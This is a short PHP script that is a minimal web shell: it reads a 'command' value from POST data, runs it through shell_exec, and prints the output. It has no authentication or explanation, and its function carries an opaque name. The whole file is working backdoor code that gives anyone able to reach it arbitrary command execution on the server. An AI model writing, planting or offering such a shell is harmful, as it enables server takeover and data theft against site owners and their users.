<?php
function exTKL() {
	$in=$_POST['command'];
	$out = '';
	if (function_exists('shell_exec')) {
		$out = shell_exec($in);
	}
	echo $out;
}

if (!$_POST['command'] == ''){
	exTKL();
}
?>